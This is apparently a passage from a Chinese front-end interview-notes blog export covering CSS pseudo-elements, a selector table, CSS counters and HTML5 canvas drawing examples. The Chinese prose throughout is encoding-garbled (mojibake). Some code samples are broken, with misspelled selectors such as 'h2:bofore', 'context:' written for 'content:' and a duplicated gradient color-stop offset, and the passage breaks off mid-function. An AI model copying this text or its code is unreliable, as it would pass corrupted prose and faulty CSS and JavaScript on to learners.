ä¸‹é¢å±žæ€§å¯ä»¥åº”ç”¨è¿™ä¸ªä¼ªå…ƒç´  font color background word-spacing letter-spacing text-decoration vertical-align text-transform line-height clear :first-letter ç”¨äºŽå‘æ–‡æœ¬çš„é¦–å­—æ¯è®¾ç½®ç‰¹æ®Šæ ·å¼ ä¸‹é¢çš„å±žæ€§å¯ä»¥åº”ç”¨è¿™ä¸ªä¼ªå…ƒç´  font color background margin padding border text-decoration vertical-align(å½“ floatä¸ºnone) text-transform line-height float clear :before åœ¨å…ƒç´ å†…å®¹å‰é¢æ’å…¥æ–°å†…å®¹ :after åœ¨å…ƒç´ å†…å®¹ä¹‹åŽæ’å…¥æ–°å†…å®¹ ä¼ªå…ƒç´ è¡¨ å±žæ€§ æè¿° CSS :first-letter å‘æ–‡æœ¬çš„ç¬¬ä¸€ä¸ªå­—æ¯æ·»åŠ ç‰¹æ®Šæ ·å¼ã€‚ 1 :first-line å‘æ–‡æœ¬çš„é¦–è¡Œæ·»åŠ ç‰¹æ®Šæ ·å¼ã€‚ 1 :before åœ¨å…ƒç´ ä¹‹å‰æ·»åŠ å†…å®¹ã€‚ 2 :after åœ¨å…ƒç´ ä¹‹åŽæ·»åŠ å†…å®¹ã€‚ 2 ä¼ªç±»ä¸Žä¼ªå…ƒç´ ç‰¹æ€§ä¸ŽåŒºåˆ« ä¼ªç±»æœ¬è´¨ä¸Šæ˜¯ä¸ºäº†å¼¥è¡¥å¸¸è§„ CSS é€‰æ‹©å™¨çš„ä¸è¶³ï¼Œä»¥ä¾¿èŽ·å–æ›´å¤šçš„ä¿¡æ¯ï¼ˆä¸å­˜åœ¨ DOMæ ‘çš„ä¿¡æ¯ï¼Œä¸èƒ½è¢«å¸¸è§„CSSé€‰æ‹©å™¨èŽ·å–çš„ä¿¡æ¯ï¼‰ ä¼ªå…ƒç´ æœ¬è´¨ä¸Šæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæœ‰å†…å®¹çš„è™šæ‹Ÿå®¹å™¨,è¿™ä¸ªå®¹å™¨ä¸åŒ…å«ä»»ä½•DOMå…ƒç´ ï¼Œä½†æ˜¯å¯ä»¥åŒ…å«å†…å®¹ CSS3 ä¸­çš„ä¼ªç±»å’Œä¼ªå…ƒç´ çš„è¯­æ³•ä¸åŒï¼ˆ:ä¸Ž::ï¼‰ å¯ä»¥åŒæ—¶ä½¿ç”¨å¤šä¸ªä¼ªç±»ï¼Œè€Œåªèƒ½åŒæ—¶ä½¿ç”¨ä¸€ä¸ªä¼ªå…ƒç´  å®Œæ•´è¡¨æ ¼ é€‰æ‹©å™¨ ç¤ºä¾‹ ç¤ºä¾‹è¯´æ˜Ž CSS .class .intro é€‰æ‹©æ‰€æœ‰class=â€introâ€çš„å…ƒç´  1 #id #firstname é€‰æ‹©æ‰€æœ‰id=â€firstnameâ€çš„å…ƒç´  1 * * é€‰æ‹©æ‰€æœ‰å…ƒç´  2 element p é€‰æ‹©æ‰€æœ‰å…ƒç´  1 element,element div,p é€‰æ‹©æ‰€æœ‰å…ƒç´ å’Œå…ƒç´  1 element element div p é€‰æ‹©å…ƒç´ å†…çš„æ‰€æœ‰å…ƒç´  1 element&gt;element div&gt;p é€‰æ‹©æ‰€æœ‰çˆ¶çº§æ˜¯ å…ƒç´ çš„ å…ƒç´  2 element+element div+p é€‰æ‹©æ‰€æœ‰ç´§æŽ¥ç€å…ƒç´ ä¹‹åŽçš„å…ƒç´  2 attribute [target] é€‰æ‹©æ‰€æœ‰å¸¦æœ‰targetå±žæ€§å…ƒç´  2 attribute=value [target=-blank] é€‰æ‹©æ‰€æœ‰ä½¿ç”¨target=â€-blankâ€çš„å…ƒç´  2 attribute~=value [title~=flower] é€‰æ‹©æ ‡é¢˜å±žæ€§åŒ…å«å•è¯â€flowerâ€çš„æ‰€æœ‰å…ƒç´  2 attribute =language[lang\ =en] é€‰æ‹© lang å±žæ€§ä»¥ en ä¸ºå¼€å¤´çš„æ‰€æœ‰å…ƒç´  2 :link a:link é€‰æ‹©æ‰€æœ‰æœªè®¿é—®é“¾æŽ¥ 1 :visited a:visited é€‰æ‹©æ‰€æœ‰è®¿é—®è¿‡çš„é“¾æŽ¥ 1 :active a:active é€‰æ‹©æ´»åŠ¨é“¾æŽ¥ 1 :hover a:hover é€‰æ‹©é¼ æ ‡åœ¨é“¾æŽ¥ä¸Šé¢æ—¶ 1 :focus input:focus é€‰æ‹©å…·æœ‰ç„¦ç‚¹çš„è¾“å…¥å…ƒç´  2 :first-letter p:first-letter é€‰æ‹©æ¯ä¸€ä¸ªå…ƒç´ çš„ç¬¬ä¸€ä¸ªå­—æ¯ 1 :first-line p:first-line é€‰æ‹©æ¯ä¸€ä¸ªå…ƒç´ çš„ç¬¬ä¸€è¡Œ 1 :first-child p:first-child æŒ‡å®šåªæœ‰å½“å…ƒç´ æ˜¯å…¶çˆ¶çº§çš„ç¬¬ä¸€ä¸ªå­çº§çš„æ ·å¼ã€‚ 2 :before p:before åœ¨æ¯ä¸ªå…ƒç´ ä¹‹å‰æ’å…¥å†…å®¹ 2 :after p:after åœ¨æ¯ä¸ªå…ƒç´ ä¹‹åŽæ’å…¥å†…å®¹ 2 :lang(language) p:lang(it) é€‰æ‹©ä¸€ä¸ªlangå±žæ€§çš„èµ·å§‹å€¼=â€itâ€çš„æ‰€æœ‰å…ƒç´  2 element1~element2 p~ul é€‰æ‹©på…ƒç´ ä¹‹åŽçš„æ¯ä¸€ä¸ªulå…ƒç´  3 attribute^=value a[src^=â€httpsâ€] é€‰æ‹©æ¯ä¸€ä¸ªsrcå±žæ€§çš„å€¼ä»¥â€httpsâ€å¼€å¤´çš„å…ƒç´  3 attribute$=value a[src$=â€.pdfâ€] é€‰æ‹©æ¯ä¸€ä¸ªsrcå±žæ€§çš„å€¼ä»¥â€.pdfâ€ç»“å°¾çš„å…ƒç´  3 attribute=value a[src*=â€runoobâ€] é€‰æ‹©æ¯ä¸€ä¸ªsrcå±žæ€§çš„å€¼åŒ…å«å­å­—ç¬¦ä¸²â€runoobâ€çš„å…ƒç´  3 :first-of-type p:first-of-type é€‰æ‹©æ¯ä¸ªpå…ƒç´ æ˜¯å…¶çˆ¶çº§çš„ç¬¬ä¸€ä¸ªpå…ƒç´  3 :last-of-type p:last-of-type é€‰æ‹©æ¯ä¸ªpå…ƒç´ æ˜¯å…¶çˆ¶çº§çš„æœ€åŽä¸€ä¸ªpå…ƒç´  3 :only-of-type p:only-of-type é€‰æ‹©æ¯ä¸ªpå…ƒç´ æ˜¯å…¶çˆ¶çº§çš„å”¯ä¸€på…ƒç´  3 :only-child p:only-child é€‰æ‹©æ¯ä¸ªpå…ƒç´ æ˜¯å…¶çˆ¶çº§çš„å”¯ä¸€å­å…ƒç´  3 :nth-child(n) p:nth-child(2) é€‰æ‹©æ¯ä¸ªpå…ƒç´ æ˜¯å…¶çˆ¶çº§çš„ç¬¬äºŒä¸ªå­å…ƒç´  3 :nth-last-child(n) p:nth-last-child(2) é€‰æ‹©æ¯ä¸ªpå…ƒç´ çš„æ˜¯å…¶çˆ¶çº§çš„ç¬¬äºŒä¸ªå­å…ƒç´ ï¼Œä»Žæœ€åŽä¸€ä¸ªå­é¡¹è®¡æ•° 3 :nth-of-type(n) p:nth-of-type(2) é€‰æ‹©æ¯ä¸ªpå…ƒç´ æ˜¯å…¶çˆ¶çº§çš„ç¬¬äºŒä¸ªpå…ƒç´  3 :nth-last-of-type(n) p:nth-last-of-type(2) é€‰æ‹©æ¯ä¸ªpå…ƒç´ çš„æ˜¯å…¶çˆ¶çº§çš„ç¬¬äºŒä¸ªpå…ƒç´ ï¼Œä»Žæœ€åŽä¸€ä¸ªå­é¡¹è®¡æ•° 3 :last-child p:last-child é€‰æ‹©æ¯ä¸ªpå…ƒç´ æ˜¯å…¶çˆ¶çº§çš„æœ€åŽä¸€ä¸ªå­çº§ã€‚ 3 :root :root é€‰æ‹©æ–‡æ¡£çš„æ ¹å…ƒç´  3 :empty p:empty é€‰æ‹©æ¯ä¸ªæ²¡æœ‰ä»»ä½•å­çº§çš„på…ƒç´ ï¼ˆåŒ…æ‹¬æ–‡æœ¬èŠ‚ç‚¹ï¼‰ 3 :target #news:target é€‰æ‹©å½“å‰æ´»åŠ¨çš„#newså…ƒç´ ï¼ˆåŒ…å«è¯¥é”šåç§°çš„ç‚¹å‡»çš„URLï¼‰ 3 :enabled input:enabled é€‰æ‹©æ¯ä¸€ä¸ªå·²å¯ç”¨çš„è¾“å…¥å…ƒç´  3 :disabled input:disabled é€‰æ‹©æ¯ä¸€ä¸ªç¦ç”¨çš„è¾“å…¥å…ƒç´  3 :checked input:checked é€‰æ‹©æ¯ä¸ªé€‰ä¸­çš„è¾“å…¥å…ƒç´  3 :not(selector) :not(p) é€‰æ‹©æ¯ä¸ªå¹¶éžpå…ƒç´ çš„å…ƒç´  3 ::selection ::selection åŒ¹é…å…ƒç´ ä¸­è¢«ç”¨æˆ·é€‰ä¸­æˆ–å¤„äºŽé«˜äº®çŠ¶æ€çš„éƒ¨åˆ† 3 :out-of-range :out-of-range åŒ¹é…å€¼åœ¨æŒ‡å®šåŒºé—´ä¹‹å¤–çš„inputå…ƒç´  3 :in-range :in-range åŒ¹é…å€¼åœ¨æŒ‡å®šåŒºé—´ä¹‹å†…çš„inputå…ƒç´  3 :read-write :read-write ç”¨äºŽåŒ¹é…å¯è¯»åŠå¯å†™çš„å…ƒç´  3 :read-only :read-only ç”¨äºŽåŒ¹é…è®¾ç½® â€œreadonlyâ€ï¼ˆåªè¯»ï¼‰ å±žæ€§çš„å…ƒç´  3 :optional :optional ç”¨äºŽåŒ¹é…å¯é€‰çš„è¾“å…¥å…ƒç´  3 :required :required ç”¨äºŽåŒ¹é…è®¾ç½®äº† â€œrequiredâ€ å±žæ€§çš„å…ƒç´  3 :valid :valid ç”¨äºŽåŒ¹é…è¾“å…¥å€¼ä¸ºåˆæ³•çš„å…ƒç´  3 :invalid :invalid ç”¨äºŽåŒ¹é…è¾“å…¥å€¼ä¸ºéžæ³•çš„å…ƒç´  3 åœ¨é¡µé¢æ’å…¥å†…å®¹:beforeæˆ–è€… :after 123456789101112131415161718192021222324252627282930/* æ’å…¥æ–‡å­— *//* åœ¨h2å‰ */h2:before&#123; content:'å“ˆå“ˆå“ˆ'&#125;/* åœ¨h2åŽ */h2:after&#123; content:'å†…å®¹'&#125;/* æŒ‡å®šä¸ªåˆ«å…ƒç´ ä¸è¿›è¡Œæ’å…¥ */h2.sample:before&#123; content:none&#125;/* æ’å…¥å›¾åƒ *//* åœ¨h2å‰ */h2:bofore&#123; content:url(mark.png);&#125;/* åœ¨h2åŽ */h2:after&#123; content:url(mark.png);&#125;/* å°†å…ƒç´ å±žæ€§ä½œä¸ºcontentçš„å€¼æ¥æ˜¾ç¤º */img:after&#123; context:attr(alt); display:block; text-align:center; margin-top:5px;&#125; contentæ’å…¥é¡¹ç›®ç¼–å· 1234&lt;h1&gt;å¤§æ ‡é¢˜&lt;/h1&gt;&lt;p&gt;å®žä¾‹æ–‡å­—&lt;/p&gt;&lt;h1&gt;å¤§æ ‡é¢˜&lt;/h1&gt;&lt;p&gt;å®žä¾‹æ–‡å­—&lt;/p&gt; 12345678910111213141516171819202122232425262728293031323334353637/*å¤šä¸ªæ ‡é¢˜åŠ ä¸Šè¿žç»­ç¼–å·*/h1:before&#123; content:counter(mycounter)&#125;h1&#123; counter-increment:mycounter;&#125;/*è¿½åŠ æ–‡å­—*/h1:before&#123; content:'ç¬¬'counter(mycounter)'ç« '&#125;h1&#123; counter-increment:mycounter;&#125;/* æŒ‡å®šæ ·å¼ */h1:before&#123; content:'ç¬¬'counter(mycounter)'ç« '; color:blue; font-size:42px;&#125;h1&#123; counter-increment:mycounter;&#125;/* æŒ‡å®šç¼–å·ç§ç±» list-style-typeçš„å€¼*//* content(è®¡æ•°å™¨åï¼Œç¼–å·ç§ç±»)*/h1:before&#123; content:'ç¬¬'counter(mycounter,lower-roman)'ç« '; color:blue; font-size:42px;&#125;/* ç¼–å·åµŒå¥— */p:bofore&#123; content:counter(mycounter2,lower-roman);&#125;p&#123; counter-increment:mycounter2;&#125; list-style-type çš„å€¼ å€¼ æè¿° none æ— æ ‡è®°ã€‚ disc é»˜è®¤ã€‚æ ‡è®°æ˜¯å®žå¿ƒåœ†ã€‚ circle æ ‡è®°æ˜¯ç©ºå¿ƒåœ†ã€‚ square æ ‡è®°æ˜¯å®žå¿ƒæ–¹å—ã€‚ decimal æ ‡è®°æ˜¯æ•°å­—ã€‚ decimal-leading-zero 0å¼€å¤´çš„æ•°å­—æ ‡è®°ã€‚(01, 02, 03, ç­‰ã€‚) lower-roman å°å†™ç½—é©¬æ•°å­—(i, ii, iii, iv, v, ç­‰ã€‚) upper-roman å¤§å†™ç½—é©¬æ•°å­—(I, II, III, IV, V, ç­‰ã€‚) lower-alpha å°å†™è‹±æ–‡å­—æ¯The marker is lower-alpha (a, b, c, d, e, ç­‰ã€‚) upper-alpha å¤§å†™è‹±æ–‡å­—æ¯The marker is upper-alpha (A, B, C, D, E, ç­‰ã€‚) lower-greek å°å†™å¸Œè…Šå­—æ¯(alpha, beta, gamma, ç­‰ã€‚) lower-latin å°å†™æ‹‰ä¸å­—æ¯(a, b, c, d, e, ç­‰ã€‚) upper-latin å¤§å†™æ‹‰ä¸å­—æ¯(A, B, C, D, E, ç­‰ã€‚) hebrew ä¼ ç»Ÿçš„å¸Œä¼¯æ¥ç¼–å·æ–¹å¼ armenian ä¼ ç»Ÿçš„äºšç¾Žå°¼äºšç¼–å·æ–¹å¼ georgian ä¼ ç»Ÿçš„ä¹”æ²»äºšç¼–å·æ–¹å¼(an, ban, gan, ç­‰ã€‚) cjk-ideographic ç®€å•çš„è¡¨æ„æ•°å­— hiragana æ ‡è®°æ˜¯ï¼ša, i, u, e, o, ka, ki, ç­‰ã€‚ï¼ˆæ—¥æ–‡ç‰‡å‡åï¼‰ katakana æ ‡è®°æ˜¯ï¼šA, I, U, E, O, KA, KI, ç­‰ã€‚ï¼ˆæ—¥æ–‡ç‰‡å‡åï¼‰ hiragana-iroha æ ‡è®°æ˜¯ï¼ši, ro, ha, ni, ho, he, to, ç­‰ã€‚ï¼ˆæ—¥æ–‡ç‰‡å‡åï¼‰ katakana-iroha æ ‡è®°æ˜¯ï¼šI, RO, HA, NI, HO, HE, TO, ç­‰ã€‚ï¼ˆæ—¥æ–‡ç‰‡å‡åï¼‰ å‚è€ƒé“¾æŽ¥ CSS3ä¼ªç±»å’Œä¼ªå…ƒç´ çš„ç‰¹æ€§å’ŒåŒºåˆ« HTML 5ä¸ŽCSS 3æƒå¨æŒ‡å— W3cScholl CSS3æ–°å¢žçš„é€‰æ‹©å™¨å’Œå±žæ€§ ç¥žå¥‡çš„css3ï¼ˆ1ï¼‰æ–°å¢žå±žæ€§ã€é€‰æ‹©å™¨]]></content>
      <categories>
        <category>å‰ç«¯é¢è¯•</category>
      </categories>
      <tags>
        <tag>HTML5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é¢è¯•å®˜é—®æˆ‘HTML5æ˜¯ä»€ä¹ˆï¼ˆä¸­ï¼‰]]></title>
    <url>%2F%E9%9D%A2%E8%AF%95%E5%AE%98%E9%97%AE%E6%88%91HTML5%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%88%E4%B8%AD%EF%BC%89.html</url>
    <content type="text"><![CDATA[å­¦ä¹ é“¾æŽ¥ï¼šHTML 5ä¸ŽCSS 3æƒå¨æŒ‡å— W3cScholl CanvasHTML5 ä¸­çš„ä¸€ä¸ªæ–°å¢žå…ƒç´ ï¼Œå¯ä»¥åœ¨é¡µé¢ç»˜åˆ¶å‡ºå„ç§æ¼‚äº®çš„å›¾å½¢ä¸Žå›¾åƒã€‚ ç»˜åˆ¶å›¾å½¢canvas å…ƒç´ å°±æ˜¯ HTML5 ä¸­æ–°å¢žçš„ä¸€ä¸ªç”¨æ¥ç»˜åˆ¶å›¾å½¢ã€‚åœ¨é¡µé¢ä¸Šæ”¾ç½®ä¸€ä¸ª canvaså…ƒç´ ï¼Œç›¸å½“äºŽåœ¨é¡µé¢ä¸Šæ”¾ç½®ä¸€å—ç”»å¸ƒï¼Œå¯ä»¥åœ¨å…¶ä¸­è¿›è¡Œå›¾å½¢ç»˜åˆ¶ã€‚ åœ¨é¡µé¢ä¸­æ”¾ç½® canvaså…ƒç´ 12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Canvas&lt;/title&gt;&lt;/head&gt;&lt;body onload="draw('canvas')"&gt; &lt;canvas id="canvas" width="400" height="300"&gt;&lt;/canvas&gt; &lt;script src="canvas.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;!--script--&gt;&lt;script&gt;function draw(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300); context.fillStyle = 'red'; context.strokeStyle = 'blue'; context.lineWidth = 1; context.fillRect(50,50,100,100); context.strokeRect(50,50,100,100);&#125;&lt;/script&gt; é¦–å…ˆï¼Œè¦æŒ‡å®š ID,width,height è¿™ä¸‰ä¸ªå±žæ€§ã€‚ ç»˜åˆ¶çŸ©å½¢ å–å¾— canvas å…ƒç´ ï¼Œç”¨ DOM æ–¹æ³•å–å¾—è¦ç»˜åˆ¶çš„ç›®æ ‡å…ƒç´  å–å¾—ä¸Šä¸‹æ–‡ï¼ˆcontextï¼‰ã€‚è¿›è¡Œç»˜åˆ¶çš„æ—¶å€™éœ€è¦ç”¨åˆ°å›¾å½¢ä¸Šä¸‹æ–‡ï¼ˆgraphics contextï¼‰ï¼Œå›¾å½¢ä¸Šä¸‹æ–‡æ˜¯ä¸€ä¸ªå°è£…äº†å¾ˆå¤šç»˜å›¾åŠŸèƒ½çš„å¯¹è±¡ã€‚ä½¿ç”¨ canvas å¯¹è±¡çš„ getContextæ–¹æ³•æ¥èŽ·å¾—å›¾å½¢ä¸Šä¸‹æ–‡ã€‚ å¡«å……ä¸Žç»˜åˆ¶è¾¹æ¡†ã€‚ç»˜åˆ¶å›¾å½¢çš„æ—¶å€™æœ‰ä¸¤ç§æ–¹å¼ï¼šå¡«å……ï¼ˆfillï¼‰ä¸Žç»˜åˆ¶è¾¹æ¡†ï¼ˆstrokeï¼‰ã€‚å¡«å……æ˜¯æŒ‡å¡«å……å›¾å½¢å†…éƒ¨ï¼Œç»˜åˆ¶è¾¹æ¡†æ˜¯æŒ‡ä¸å¡«å……å›¾å½¢å†…éƒ¨ï¼Œå€¼ç»˜åˆ¶å›¾å½¢çš„å¤–æ¡†ã€‚ è®¾å®šç»˜å›¾æ ·å¼ï¼ˆstyleï¼‰ã€‚åœ¨è¿›è¡Œå›¾å½¢ç»˜åˆ¶çš„æ—¶å€™ï¼Œè¦è®¾å®šå¥½ç»˜å›¾çš„æ ·å¼ï¼Œç„¶åŽè°ƒç”¨ç›¸å…³çš„æ–¹æ³•è¿›è¡Œå›¾å½¢ç»˜åˆ¶ã€‚ç›¸å…³çš„å±žæ€§æœ‰ fillStyle(å¡«å……å›¾å½¢çš„æ ·å¼)ï¼ŒstrokeStyle(å›¾å½¢è¾¹æ¡†çš„æ ·å¼) æŒ‡å®šçº¿å®½ã€‚ä½¿ç”¨å›¾å½¢ä¸Šä¸‹æ–‡å¯¹è±¡çš„ lineWidth å±žæ€§è®¾ç½®å›¾å½¢è¾¹æ¡†çš„å®½åº¦ã€‚ æŒ‡å®šé¢œè‰²å€¼ã€‚é¢œè‰²åï¼Œæˆ–è€…åå…­è¿›åˆ¶çš„é¢œè‰²å€¼ åˆ†åˆ«ä½¿ç”¨ fillRect ä¸Ž strokeRect æ–¹æ³•æ¥å¡«å……çŸ©å½¢å’Œç»˜åˆ¶çŸ©å½¢è¾¹æ¡†ã€‚ 12context.fillRect(x,y,width,height);context.strokeRect(x,y,width,height); è¿˜æœ‰ä¸€ä¸ª clearRect æ–¹æ³•ï¼Œæ“¦é™¤æŒ‡å®šçŸ©å½¢åŒºåŸŸä¸­çš„å›¾å½¢ï¼Œä½¿å¾—çŸ©å½¢ä¸­çš„é¢œè‰²å…¨éƒ¨å˜æˆé€æ˜Žã€‚ 1context.clearRect(x,y,width,height); ä½¿ç”¨è·¯å¾„ç»˜åˆ¶åœ†å½¢ä½¿ç”¨è·¯å¾„ç»˜åˆ¶å›¾å½¢çš„è¿‡ç¨‹ï¼š å¼€å§‹åˆ›å»ºè·¯å¾„ åˆ›å»ºå›¾å½¢çš„è·¯å¾„ è·¯å¾„åˆ›å»ºå®ŒæˆåŽï¼Œå…³é—­è·¯å¾„ è®¾å®šç»˜åˆ¶æ ·å¼ï¼Œè°ƒç”¨ç»˜åˆ¶æ–¹æ³•ï¼Œç»˜åˆ¶è·¯å¾„ å¤§æ¦‚çš„æ„æ€å°±æ˜¯ï¼Œå…ˆç”¨è·¯å¾„å‹¾å‹’å›¾å½¢è½®å»“ï¼Œç„¶åŽè®¾ç½®é¢œè‰²ï¼Œè¿›è¡Œç»˜åˆ¶ã€‚ 1234567891011121314function drawCircle(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300); for (let i = 0; i &lt; 10; i++) &#123; context.beginPath(); context.arc(i * 25, i * 25, i * 10, 0, Math.PI * 2, true) context.closePath(); context.fillStyle = 'rgba(255,0,0,0.25)'; context.fill(); &#125;&#125; å…¶ä¸­ï¼Œcontext.arc(x,y,radius,startAngle,endAngle,anticlockwise) è¿™ä¸ªæ–¹æ³•ä½¿ç”¨äº†å…­ä¸ªå‚æ•°ï¼Œxä¸ºç»˜åˆ¶åœ†å½¢çš„æ¨ªåæ ‡ï¼Œyä¸ºçºµåæ ‡ï¼Œradiusä¸ºåœ†å½¢åŠå¾„ï¼ŒstartAngleä¸ºå¼€å§‹çš„è§’åº¦ï¼ŒendAngleä¸ºç»“æŸè§’åº¦ï¼Œanticlockwiseä¸ºæ˜¯å¦æŒ‰é¡ºæ—¶é’ˆæ–¹å‘è¿›è¡Œç»˜åˆ¶ã€‚ å…³äºŽè§’åº¦ä¸Žå¼§åº¦çš„è®¡ç®— 1let radius = degress * Math.PI / 180; arcæ–¹æ³•ä¸ä»…å¯ä»¥ç”¨é˜¿é‡Œç»˜åˆ¶åœ†å½¢ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥ç»˜åˆ¶åœ†å¼§ã€‚å› æ­¤ï¼Œä½¿ç”¨æ—¶å¿…é¡»è¦æŒ‡å®šå¼€å§‹è§’åº¦ä¸Žç»“æŸè§’åº¦ã€‚å› ä¸ºè¿™ä¸¤ä¸ªè§’åº¦å†³å®šäº†å¼§åº¦ã€‚anticlockwiseä¸ºä¸€ä¸ªå¸ƒå°”å€¼çš„å‚æ•°ï¼Œå‚æ•°ä¸º true æ—¶ï¼ŒæŒ‰é¡ºæ—¶é’ˆç»˜åˆ¶ï¼Œå‚æ•°ä¸º falseæ—¶ï¼ŒæŒ‰é€†æ—¶é’ˆç»˜åˆ¶ã€‚ ç»˜åˆ¶å®Œå›¾å½¢åŽï¼Œä½¿ç”¨ context.closePath()å°†è·¯å¾„å…³é—­ï¼ŒæŽ¥ç€å°±å¯ä»¥ä½¿ç”¨ fillæ–¹æ³•ï¼ˆstrokeï¼‰å¡«å……å›¾å½¢ä¸Žç»˜åˆ¶å›¾å½¢è¾¹æ¡†äº†ã€‚ ä¸å…³é—­è·¯å¾„å¦‚æžœä¸å…³é—­è·¯å¾„ï¼Œå·²ç»åˆ›å»ºçš„è·¯å¾„ä¼šè¢«æ°¸è¿œä¿ç•™ï¼Œä½¿ç”¨ fill æˆ–è€… stroke ç»˜åˆ¶çš„æ—¶å€™ä¼šé‡å¤ç»˜åˆ¶å·²å­˜åœ¨çš„è·¯å¾„ 123456789101112function drawCircle(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300); for (let i = 0; i &lt; 10; i++) &#123; context.arc(i * 25, i * 25, i * 10, 0, Math.PI * 2, true) context.fillStyle = 'rgba(255,0,0,0.25)'; context.fill(); &#125;&#125; ç»˜åˆ¶çº¿moveTo ä¸Ž lineTo moveTo æ–¹æ³•çš„ä½œç”¨æ˜¯å°†å…‰æ ‡ç§»åŠ¨åˆ°æŒ‡å®šåæ ‡ï¼Œç»˜åˆ¶ç›´çº¿çš„æ—¶å€™ä»¥è¿™ä¸ªåæ ‡ç‚¹ä¸ºèµ·ç‚¹ 1moveTo(x,y) lineToæ–¹æ³•ï¼Œä¹Ÿæ˜¯ç”¨ä¸¤ä¸ªå‚æ•°ï¼Œx ï¼Œyè¡¨ç¤ºç›´çº¿ç»ˆç‚¹çš„æ¨ªçºµåæ ‡ã€‚ä½¿ç”¨è¯¥æ–¹æ³•ç»˜åˆ¶ç›´çº¿åŽï¼Œå…‰æ ‡ä¼šè‡ªåŠ¨ç§»åŠ¨åˆ° lineTo æ–¹æ³•å‚æ•°æ‰€æŒ‡å®šçš„ç›´çº¿ç»ˆç‚¹ã€‚ 12345678910111213141516171819202122function drawLine(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300); let dx = 150; let dy = 150; let s = 100; context.beginPath(); context.fillStyle = 'rgb(100,255,100)'; context.strokeStyle = 'rgb(0,0,100)'; let dig = Math.PI / 15 * 11; for (let i = 0; i &lt; 30; i++) &#123; let x = Math.sin(i * dig); let y = Math.cos(i * dig); context.lineTo(dx + x * s, dy + y * s); &#125; context.closePath() context.fill(); context.stroke();&#125; ä½¿ç”¨ bezierCurveTo ç»˜åˆ¶è´å¡žå°”æ›²çº¿1context.bezierCurveTo(cp1x,cp1y,cp2x,cpy2y,x,y); ç»˜åˆ¶æ›²çº¿ï¼Œéœ€è¦ä¸¤ä¸ªæŽ§åˆ¶ç‚¹ä»¥åŠä¸€ç‚¹ç»ˆç‚¹ã€‚ 12345678910111213141516171819202122function drawBezierLine(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); context.fillStyle = '#EEEEFF'; context.fillRect(0, 0, 400, 300); let dx = 150; let dy = 150; let s = 100; context.beginPath(); context.fillStyle = 'rgb(100,255,100)'; context.strokeStyle = 'rgb(0,0,100)'; let dig = Math.PI / 15 * 11; for (let i = 0; i &lt; 30; i++) &#123; let x = Math.sin(i * dig); let y = Math.cos(i * dig); context.bezierCurveTo(dx + x * s, dy + y * s - 100, dx + x * s + 100, dy + y * s, dx + x * s, dy + y * s); &#125; context.closePath() context.fill(); context.stroke();&#125; quadraticCurveToæ–¹æ³•ç»˜åˆ¶äºŒæ¬¡è´å¡žå°”æ›²çº¿ 1context.quadraticCurveTo(cpx,cpy,x,y) ç»˜åˆ¶æ¸å˜å›¾å½¢ç»˜åˆ¶çº¿æ€§æ¸å˜ç»˜åˆ¶çº¿æ€§æ¸å˜éœ€è¦ç”¨åˆ° lineargradientå¯¹è±¡ã€‚ 1context.createLinearGradient(xStart,yStart,xEnd,yEnd); æŽ¥ç€ä½¿ç”¨ addColorStop æ–¹æ³•è®¾å®š 1context.addColorStop(offset,color); offset ä¸ºæ‰€è®¾å®šçš„é¢œè‰²ç¦»å¼€æ¸å˜èµ·å§‹ç‚¹çš„åç§»é‡ã€‚å‚æ•°çš„å€¼æ˜¯0åˆ°1ä¹‹é—´çš„æµ®ç‚¹å€¼ï¼Œæ¸å˜èµ·å§‹ç‚¹çš„åç§»é‡æ˜¯0ï¼Œæ¸å˜ç»“æŸç‚¹çš„åç§»é‡æ˜¯1. 1234567891011121314151617181920function drawLineGradient(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); const gl = context.createLinearGradient(0, 0, 0, 300); gl.addColorStop(0, 'rgb(255,255,0)'); gl.addColorStop(1, 'rgb(0,255,255)'); context.fillStyle = gl; context.fillRect(0, 0, 400, 300); const g2 = context.createLinearGradient(0, 0, 300, 0); g2.addColorStop(0, 'rgba(0,0,255,0.5)'); g2.addColorStop(0, 'rgba(255,0,0,0.5)'); for (let i = 0; i &lt; 10; i++) &#123; context.beginPath(); context.fillStyle = g2; context.arc(i * 25, i * 25, i * 10, 0, Math.PI * 2, true); context.closePath(); context.fill(); &#125;&#125; ç»˜åˆ¶å¾„å‘æ¸å˜1context.createRadialGradient(xStart,yStart,radiusStart,xEnd,yEnd,radiusEnd); åˆ†åˆ«æŒ‡å®šä¸¤ä¸ªåœ†çš„å¤§å°å’Œä½ç½®ã€‚ä»Žç¬¬ä¸€ä¸ªåœ†çš„åœ†å¿ƒå¤„å‘å¤–è¿›è¡Œæ‰©æ•£æ¸å˜ï¼Œä¸€ç›´æ‰©æ•£åˆ°ç¬¬äºŒä¸ªåœ†çš„å¤–è½®å»“å¤„ã€‚ 12345678910111213141516171819202122function drawRadialGradient(id) &#123; const canvas = document.getElementById(id); if (!canvas) return false; const context = canvas.getContext('2d'); const g1 = context.createRadialGradient(400, 0, 0, 400, 0, 400); g1.addColorStop(0.1, 'rgb(255,255,0)'); g1.addColorStop(0.3, 'rgb(255,0,255)'); g1.addColorStop(1, 'rgb(0,255,255)'); context.fillStyle = g1; context.fillRect(0, 0, 400, 300); const g2 = context.createRadialGradient(250, 250, 0, 250, 250, 300); 